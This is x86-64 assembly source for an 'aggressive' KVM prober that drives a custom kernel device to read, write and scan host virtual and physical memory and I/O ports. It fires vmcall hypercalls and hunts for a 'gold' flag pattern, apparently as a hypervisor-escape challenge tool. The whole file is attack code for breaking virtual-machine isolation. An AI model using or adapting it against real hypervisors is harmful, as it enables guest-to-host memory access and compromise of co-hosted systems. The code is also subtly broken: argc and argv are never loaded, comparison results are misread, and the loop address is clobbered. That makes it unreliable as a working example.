; KVM Prober - Aggressive ASM Implementation
; Optimized for the aggressive driver version

section .data
    device_path: db "/dev/kvm_probe_dev", 0

    ; Command strings
    cmd_readport:      db "readport", 0
    cmd_writeport:     db "writeport", 0
    cmd_readhostmem:   db "readhostmem", 0
    cmd_writehostmem:  db "writehostmem", 0
    cmd_scanhostmem:   db "scanhostmem", 0
    cmd_readhostphys:  db "readhostphys", 0
    cmd_writehostphys: db "writehostphys", 0
    cmd_scanhostphys:  db "scanhostphys", 0
    cmd_gold:          db "--gold", 0

    ; Output strings
    gold_msg:     db "[GOLD] Found pattern at address: 0x", 0
    hypercall_msg: db "[HYPERCALL] Response: 0x", 0
    newline:      db 10, 0
    addr_sep:     db " | ", 0
    hex_header:   db "HEX: ", 0
    ascii_header: db "ASCII: ", 0
    error_device: db "Error: Cannot open device", 10, 0
    error_usage:  db "Usage: kvm_prober <command> [args...]", 10, 0
    error_aggressive: db "Aggressive mode: Some operations may fail or crash", 10, 0

    hex_digits: db "0123456789abcdef", 0

section .bss
    fd: resq 1
    gold_enabled: resq 1
    keywords_ptr: resq 1
    read_buffer: resb 65536
    output_buf: resb 131072

section .text
    global _start

_start:
    jmp main

; ============================================================================
; String Helpers
; ============================================================================

; strcmp: rdi=str1, rsi=str2 | sets ZF if equal
strcmp:
    xor rax, rax
.loop:
    mov al, byte [rdi]
    mov cl, byte [rsi]
    cmp al, cl
    jne .done
    test al, al
    jz .done
    inc rdi
    inc rsi
    jmp .loop
.done:
    ret

; strlen: rdi=string | rax=length
strlen:
    xor rax, rax
.loop:
    cmp byte [rdi + rax], 0
    je .done
    inc rax
    jmp .loop
.done:
    ret

; parse_hex_digit: al=char | al=value (0-15), CF=error
parse_hex_digit:
    cmp al, '0'
    jl .invalid
    cmp al, '9'
    jle .digit
    cmp al, 'a'
    jl .check_upper
    cmp al, 'f'
    jle .lower_hex
.check_upper:
    cmp al, 'A'
    jl .invalid
    cmp al, 'F'
    jle .upper_hex
    jmp .invalid
.digit:
    sub al, '0'
    clc
    ret
.lower_hex:
    sub al, 'a'
    add al, 10
    clc
    ret
.upper_hex:
    sub al, 'A'
    add al, 10
    clc
    ret
.invalid:
    stc
    ret

; parse_hex_string: rsi=string | rax=64-bit value
parse_hex_string:
    xor rax, rax
    xor rcx, rcx
.loop:
    mov cl, byte [rsi]
    test cl, cl
    jz .done
    cmp cl, ' '
    je .done
    mov al, cl
    push rcx
    call parse_hex_digit
    pop rcx
    jc .done
    shl rax, 4
    movzx rcx, cl
    or rax, rcx
    inc rsi
    jmp .loop
.done:
    ret

; parse_decimal_string: rsi=string | rax=value
parse_decimal_string:
    xor rax, rax
    xor rcx, rcx
.loop:
    mov cl, byte [rsi]
    cmp cl, '0'
    jl .done
    cmp cl, '9'
    jg .done
    sub cl, '0'
    imul rax, 10
    movzx rcx, cl
    add rax, rcx
    inc rsi
    jmp .loop
.done:
    ret

; ============================================================================
; I/O Helpers
; ============================================================================

; write_string: rdi=string
write_string:
    push rax
    push rsi
    push rdx
    mov rsi, rdi
    call strlen
    mov rdx, rax
    mov rax, 1
    mov rdi, 1
    syscall
    pop rdx
    pop rsi
    pop rax
    ret

; write_hex_byte: al=byte | outputs "XX"
write_hex_byte:
    push rax
    push rdi
    push rsi
    push rdx

    mov rdi, output_buf
    mov ah, al
    shr al, 4
    and al, 0xF
    mov al, byte [hex_digits + rax]
    mov byte [rdi], al

    mov al, ah
    and al, 0x0F
    mov al, byte [hex_digits + rax]
    mov byte [rdi + 1], al

    mov rax, 1
    mov rdi, 1
    mov rsi, output_buf
    mov rdx, 2
    syscall

    pop rdx
    pop rsi
    pop rdi
    pop rax
    ret

; write_hex_qword: rax=value | outputs "0x%016lx"
write_hex_qword:
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi

    mov rsi, output_buf
    mov byte [rsi], '0'
    mov byte [rsi + 1], 'x'
    add rsi, 2

    mov rbx, rax
    mov rcx, 16

.hex_loop:
    mov rax, rbx
    shr rax, 60
    and rax, 0xF
    mov al, byte [hex_digits + rax]
    mov byte [rsi], al
    inc rsi
    shl rbx, 4
    dec rcx
    jnz .hex_loop

    mov rdx, rsi
    sub rdx, output_buf
    mov rax, 1
    mov rdi, 1
    mov rsi, output_buf
    syscall

    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    ret

; write_newline
write_newline:
    push rax
    push rsi
    push rdx
    mov rax, 1
    mov rdi, 1
    mov rsi, newline
    mov rdx, 1
    syscall
    pop rdx
    pop rsi
    pop rax
    ret

; write_buffer_hex_ascii: rdi=buffer, rsi=length
write_buffer_hex_ascii:
    push rax
    push rbx
    push rcx
    push rdx
    push rsi
    push rdi

    mov rbx, rdi
    mov rcx, rsi
    xor rdx, rdx

    mov rdi, hex_header
    call write_string

.hex_loop:
    cmp rdx, rcx
    jge .hex_done

    mov al, byte [rbx + rdx]
    call write_hex_byte

    mov al, ' '
    mov byte [output_buf], al
    push rdx
    mov rax, 1
    mov rdi, 1
    mov rsi, output_buf
    mov rdx, 1
    syscall
    pop rdx

    inc rdx
    jmp .hex_loop

.hex_done:
    call write_newline

    mov rdi, ascii_header
    call write_string

    xor rdx, rdx
.ascii_loop:
    cmp rdx, rcx
    jge .ascii_done

    mov al, byte [rbx + rdx]
    cmp al, 32
    jl .not_printable
    cmp al, 126
    jg .not_printable

    mov byte [output_buf], al
    jmp .print_ascii

.not_printable:
    mov byte [output_buf], '.'

.print_ascii:
    push rdx
    mov rax, 1
    mov rdi, 1
    mov rsi, output_buf
    mov rdx, 1
    syscall
    pop rdx

    inc rdx
    jmp .ascii_loop

.ascii_done:
    call write_newline

    pop rdi
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    pop rax
    ret

; ============================================================================
; Device Operations
; ============================================================================

; open_device: rax=fd or -1 on error
open_device:
    mov rax, 2
    mov rdi, device_path
    mov rsi, 2
    xor rdx, rdx
    syscall
    ret

; close_device: rdi=fd
close_device:
    mov rax, 3
    syscall
    ret

; ============================================================================
; Gold Pattern Detection
; ============================================================================

; check_gold_pattern: rdi=buffer, rsi=length, rdx=base_address
; Returns: rax=1 if found, 0 otherwise
check_gold_pattern:
    push rbx
    push rcx
    push rdx
    push rsi

    mov rbx, rdi
    mov rcx, rsi
    mov rsi, rdx
    xor rax, rax
    xor rdx, rdx

.search_loop:
    cmp rdx, rcx
    jge .search_done

    ; Check 8-byte gold pattern (0xefbeadde44434241 in little-endian)
    cmp rdx, rcx
    jge .next_byte

    mov rax, [rbx + rdx]
    cmp rax, 0xefbeadde44434241
    jne .next_byte

    ; Found gold pattern
    mov rax, 1

    mov rdi, gold_msg
    call write_string

    mov rax, rsi
    add rax, rdx
    call write_hex_qword
    call write_newline

    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

.next_byte:
    inc rdx
    jmp .search_loop

.search_done:
    xor rax, rax
    pop rsi
    pop rdx
    pop rcx
    pop rbx
    ret

; check_keywords: rdi=buffer, rsi=length, rdx=keywords
; Returns: rax=1 if found, 0 otherwise
check_keywords:
    push rbx
    push rcx
    push rdi
    push rsi
    push rdx

    test rdx, rdx
    jz .no_keywords

    xor rbx, rbx

.kw_search:
    cmp rbx, rsi
    jge .kw_not_found

    mov cl, byte [rdx]
    cmp byte [rdi + rbx], cl
    je .kw_found

    inc rbx
    jmp .kw_search

.kw_found:
    mov rax, 1
    jmp .kw_exit

.kw_not_found:
    xor rax, rax
    jmp .kw_exit

.no_keywords:
    mov rax, 1

.kw_exit:
    pop rdx
    pop rsi
    pop rdi
    pop rcx
    pop rbx
    ret

; ============================================================================
; Command Handlers - UPDATED FOR AGGRESSIVE DRIVER
; ============================================================================

; handle_readport: rbx=argc, r12=argv
handle_readport:
    cmp rbx, 4
    jl .error

    ; port structure at [rsp - 16]:
    ; +0: port (short)
    ; +2: size (int)
    ; +6: value (int)

    sub rsp, 16

    mov rsi, [r12 + 16]
    call parse_hex_string
    mov word [rsp], ax

    mov rsi, [r12 + 24]
    call parse_decimal_string
    mov dword [rsp + 4], eax

    mov rdi, [fd]
    mov rsi, 0x1001
    mov rdx, rsp
    mov rax, 16
    syscall

    ; Hypercall after aggressive port read
    mov rax, 102
    vmcall

    test rax, rax
    jz .read_port_done

    mov rdi, hypercall_msg
    call write_string
    call write_hex_qword
    call write_newline

.read_port_done:
    add rsp, 16
    ret

.error:
    mov rdi, error_usage
    call write_string
    ret

; handle_writeport: rbx=argc, r12=argv
handle_writeport:
    cmp rbx, 5
    jl .error

    sub rsp, 16

    mov rsi, [r12 + 16]
    call parse_hex_string
    mov word [rsp], ax

    mov rsi, [r12 + 24]
    call parse_hex_string
    mov dword [rsp + 4], eax

    mov rsi, [r12 + 32]
    call parse_decimal_string
    mov dword [rsp + 8], eax

    mov rdi, [fd]
    mov rsi, 0x1002
    mov rdx, rsp
    mov rax, 16
    syscall

    ; Hypercall after aggressive port write
    mov rax, 100
    vmcall

    test rax, rax
    jz .write_port_done

    mov rdi, hypercall_msg
    call write_string
    call write_hex_qword
    call write_newline

.write_port_done:
    add rsp, 16
    ret

.error:
    mov rdi, error_usage
    call write_string
    ret

; handle_readhostmem: rbx=argc, r12=argv - UPDATED
handle_readhostmem:
    cmp rbx, 4
    jl .error

    mov rsi, [r12 + 16]
    call parse_hex_string
    mov r13, rax

    mov rsi, [r12 + 24]
    call parse_decimal_string
    mov r14, rax

    cmp r14, 65536
    jg .error

    ; ioctl structure: host_addr, length, user_buffer
    sub rsp, 24
    mov qword [rsp], r13
    mov qword [rsp + 8], r14
    mov qword [rsp + 16], read_buffer

    mov rdi, [fd]
    mov rsi, 0x1016
    mov rdx, rsp
    mov rax, 16
    syscall

    ; Hypercall after aggressive memory read
    mov rax, 102
    vmcall

    test rax, rax
    jnz .hc_resp

    ; Check gold patterns (aggressive driver logs to kernel too)
    mov rdi, read_buffer
    mov rsi, r14
    mov rdx, r13
    call check_gold_pattern

    ; Print buffer
    mov rdi, read_buffer
    mov rsi, r14
    call write_buffer_hex_ascii

    jmp .readhostmem_done

.hc_resp:
    mov rdi, hypercall_msg
    call write_string
    call write_hex_qword
    call write_newline

.readhostmem_done:
    add rsp, 24
    ret

.error:
    mov rdi, error_usage
    call write_string
    ret

; handle_writehostmem: rbx=argc, r12=argv - UPDATED
handle_writehostmem:
    cmp rbx, 4
    jl .error

    mov rsi, [r12 + 16]
    call parse_hex_string
    mov r13, rax

    ; Parse hex string
    mov rsi, [r12 + 24]
    xor r14, r14
    xor r15, r15

.hex_parse_loop:
    mov cl, byte [rsi]
    test cl, cl
    jz .hex_parse_done

    cmp cl, ' '
    je .hex_parse_skip

    mov al, cl
    call parse_hex_digit
    jc .hex_parse_done

    test r15, r15
    jnz .second_nibble

    ; First nibble
    mov byte [read_buffer + r14], al
    shl byte [read_buffer + r14], 4
    mov r15, 1
    jmp .hex_parse_next

.second_nibble:
    or byte [read_buffer + r14], al
    inc r14
    xor r15, r15

.hex_parse_next:
    inc rsi
    jmp .hex_parse_loop

.hex_parse_skip:
    inc rsi
    jmp .hex_parse_loop

.hex_parse_done:
    test r15, r15
    jz .no_half_byte
    inc r14

.no_half_byte:
    ; ioctl structure
    sub rsp, 24
    mov qword [rsp], r13
    mov qword [rsp + 8], r14
    mov qword [rsp + 16], read_buffer

    mov rdi, [fd]
    mov rsi, 0x1017
    mov rdx, rsp
    mov rax, 16
    syscall

    ; Hypercall after aggressive memory write
    mov rax, 100
    vmcall

    test rax, rax
    jz .writehostmem_done

    mov rdi, hypercall_msg
    call write_string
    call write_hex_qword
    call write_newline

.writehostmem_done:
    add rsp, 24
    ret

.error:
    mov rdi, error_usage
    call write_string
    ret

; handle_scanhostmem: rbx=argc, r12=argv - UPDATED
handle_scanhostmem:
    cmp rbx, 5
    jl .error

    mov rsi, [r12 + 16]
    call parse_hex_string
    mov r13, rax

    mov rsi, [r12 + 24]
    call parse_hex_string
    mov r14, rax

    mov rsi, [r12 + 32]
    call parse_decimal_string
    mov r15, rax

    xor r8, r8
    xor r9, r9

    cmp rbx, 6
    jl .no_gold

    mov rsi, [r12 + 40]
    mov rdi, cmd_gold
    call strcmp
    jne .no_gold

    mov r8, 1

    cmp rbx, 7
    jl .no_gold

    mov r9, [r12 + 48]

.no_gold:
    mov rax, r13

.scan_loop:
    cmp rax, r14
    jge .scan_done

    sub rsp, 24
    mov qword [rsp], rax
    mov qword [rsp + 8], r15
    mov qword [rsp + 16], read_buffer

    mov rdi, [fd]
    mov rsi, 0x1016
    mov rdx, rsp
    mov rax, 16
    syscall

    add rsp, 24

    ; Hypercall after each aggressive memory read
    mov rax, 102
    vmcall

    test rax, rax
    jz .skip_hc_resp

    mov rdi, hypercall_msg
    call write_string
    call write_hex_qword
    call write_newline

.skip_hc_resp:
    mov rdi, read_buffer
    mov rsi, r15
    mov rdx, rax
    call check_gold_pattern

    test r8, r8
    jz .always_print

    test rax, rax
    jnz .print_scan_data

    mov rdi, read_buffer
    mov rsi, r15
    mov rdx, r9
    call check_keywords

    test rax, rax
    jz .skip_print

.print_scan_data:
    mov rdi, read_buffer
    mov rsi, r15
    call write_buffer_hex_ascii

.skip_print:
    add rax, r15
    jmp .scan_loop

.always_print:
    mov rdi, read_buffer
    mov rsi, r15
    call write_buffer_hex_ascii

    add rax, r15
    jmp .scan_loop

.scan_done:
    ret

.error:
    mov rdi, error_usage
    call write_string
    ret

; handle_readhostphys: rbx=argc, r12=argv - UPDATED
handle_readhostphys:
    cmp rbx, 4
    jl .error

    mov rsi, [r12 + 16]
    call parse_hex_string
    mov r13, rax

    mov rsi, [r12 + 24]
    call parse_decimal_string
    mov r14, rax

    cmp r14, 65536
    jg .error

    sub rsp, 24
    mov qword [rsp], r13
    mov qword [rsp + 8], r14
    mov qword [rsp + 16], read_buffer

    mov rdi, [fd]
    mov rsi, 0x1018
    mov rdx, rsp
    mov rax, 16
    syscall

    ; Hypercall after aggressive physical memory read
    mov rax, 102
    vmcall

    test rax, rax
    jnz .hc_resp

    mov rdi, read_buffer
    mov rsi, r14
    mov rdx, r13
    call check_gold_pattern

    mov rdi, read_buffer
    mov rsi, r14
    call write_buffer_hex_ascii

    jmp .readhostphys_done

.hc_resp:
    mov rdi, hypercall_msg
    call write_string
    call write_hex_qword
    call write_newline

.readhostphys_done:
    add rsp, 24
    ret

.error:
    mov rdi, error_usage
    call write_string
    ret

; handle_writehostphys: rbx=argc, r12=argv - UPDATED
handle_writehostphys:
    cmp rbx, 4
    jl .error

    mov rsi, [r12 + 16]
    call parse_hex_string
    mov r13, rax

    mov rsi, [r12 + 24]
    xor r14, r14
    xor r15, r15

.hex_parse_loop:
    mov cl, byte [rsi]
    test cl, cl
    jz .hex_parse_done

    cmp cl, ' '
    je .hex_parse_skip

    mov al, cl
    call parse_hex_digit
    jc .hex_parse_done

    test r15, r15
    jnz .second_nibble_phys

    ; First nibble
    mov byte [read_buffer + r14], al
    shl byte [read_buffer + r14], 4
    mov r15, 1
    jmp .hex_parse_next_phys

.second_nibble_phys:
    or byte [read_buffer + r14], al
    inc r14
    xor r15, r15

.hex_parse_next_phys:
    inc rsi
    jmp .hex_parse_loop

.hex_parse_skip:
    inc rsi
    jmp .hex_parse_loop

.hex_parse_done:
    test r15, r15
    jz .no_half_byte_phys
    inc r14

.no_half_byte_phys:
    sub rsp, 24
    mov qword [rsp], r13
    mov qword [rsp + 8], r14
    mov qword [rsp + 16], read_buffer

    mov rdi, [fd]
    mov rsi, 0x1019
    mov rdx, rsp
    mov rax, 16
    syscall

    ; Hypercall after aggressive physical memory write
    mov rax, 100
    vmcall

    test rax, rax
    jz .writehostphys_done

    mov rdi, hypercall_msg
    call write_string
    call write_hex_qword
    call write_newline

.writehostphys_done:
    add rsp, 24
    ret

.error:
    mov rdi, error_usage
    call write_string
    ret

; handle_scanhostphys: rbx=argc, r12=argv - UPDATED
handle_scanhostphys:
    cmp rbx, 5
    jl .error

    mov rsi, [r12 + 16]
    call parse_hex_string
    mov r13, rax

    mov rsi, [r12 + 24]
    call parse_hex_string
    mov r14, rax

    mov rsi, [r12 + 32]
    call parse_decimal_string
    mov r15, rax

    xor r8, r8
    xor r9, r9

    cmp rbx, 6
    jl .no_gold_phys

    mov rsi, [r12 + 40]
    mov rdi, cmd_gold
    call strcmp
    jne .no_gold_phys

    mov r8, 1

    cmp rbx, 7
    jl .no_gold_phys

    mov r9, [r12 + 48]

.no_gold_phys:
    mov rax, r13

.scan_loop_phys:
    cmp rax, r14
    jge .scan_done_phys

    sub rsp, 24
    mov qword [rsp], rax
    mov qword [rsp + 8], r15
    mov qword [rsp + 16], read_buffer

    mov rdi, [fd]
    mov rsi, 0x1018
    mov rdx, rsp
    mov rax, 16
    syscall

    add rsp, 24

    ; Hypercall after each aggressive physical memory read
    mov rax, 102
    vmcall

    test rax, rax
    jz .skip_hc_resp_phys

    mov rdi, hypercall_msg
    call write_string
    call write_hex_qword
    call write_newline

.skip_hc_resp_phys:
    mov rdi, read_buffer
    mov rsi, r15
    mov rdx, rax
    call check_gold_pattern

    test r8, r8
    jz .always_print_phys

    test rax, rax
    jnz .print_scan_data_phys

    mov rdi, read_buffer
    mov rsi, r15
    mov rdx, r9
    call check_keywords

    test rax, rax
    jz .skip_print_phys

.print_scan_data_phys:
    mov rdi, read_buffer
    mov rsi, r15
    call write_buffer_hex_ascii

.skip_print_phys:
    add rax, r15
    jmp .scan_loop_phys

.always_print_phys:
    mov rdi, read_buffer
    mov rsi, r15
    call write_buffer_hex_ascii

    add rax, r15
    jmp .scan_loop_phys

.scan_done_phys:
    ret

.error:
    mov rdi, error_usage
    call write_string
    ret

; ============================================================================
; Main Entry Point - UPDATED
; ============================================================================

main:
    push rbx
    push r12
    push r13
    push r14
    push r15

    mov rbx, rdi
    mov r12, rsi

    cmp rbx, 2
    jl .usage

    ; Print aggressive mode warning
    mov rdi, error_aggressive
    call write_string

    ; Open device
    call open_device
    cmp rax, 0
    jl .error_dev

    mov [fd], rax

    ; Get command
    mov rsi, [r12 + 8]

    mov rdi, cmd_readport
    call strcmp
    test eax, eax
    jz .do_readport

    mov rsi, [r12 + 8]
    mov rdi, cmd_writeport
    call strcmp
    test eax, eax
    jz .do_writeport

    mov rsi, [r12 + 8]
    mov rdi, cmd_readhostmem
    call strcmp
    test eax, eax
    jz .do_readhostmem

    mov rsi, [r12 + 8]
    mov rdi, cmd_writehostmem
    call strcmp
    test eax, eax
    jz .do_writehostmem

    mov rsi, [r12 + 8]
    mov rdi, cmd_readhostphys
    call strcmp
    test eax, eax
    jz .do_readhostphys

    mov rsi, [r12 + 8]
    mov rdi, cmd_writehostphys
    call strcmp
    test eax, eax
    jz .do_writehostphys

    mov rsi, [r12 + 8]
    mov rdi, cmd_scanhostmem
    call strcmp
    test eax, eax
    jz .do_scanhostmem

    mov rsi, [r12 + 8]
    mov rdi, cmd_scanhostphys
    call strcmp
    test eax, eax
    jz .do_scanhostphys

.usage:
    mov rdi, error_usage
    call write_string
    jmp .exit

.do_readport:
    call handle_readport
    jmp .exit

.do_writeport:
    call handle_writeport
    jmp .exit

.do_readhostmem:
    call handle_readhostmem
    jmp .exit

.do_writehostmem:
    call handle_writehostmem
    jmp .exit

.do_readhostphys:
    call handle_readhostphys
    jmp .exit

.do_writehostphys:
    call handle_writehostphys
    jmp .exit

.do_scanhostmem:
    call handle_scanhostmem
    jmp .exit

.do_scanhostphys:
    call handle_scanhostphys
    jmp .exit

.error_dev:
    mov rdi, error_device
    call write_string

.exit:
    mov rdi, [fd]
    cmp rdi, 0
    jle .skip_close
    call close_device

.skip_close:
    xor rax, rax
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    mov rax, 231
    xor rdi, rdi
    syscall
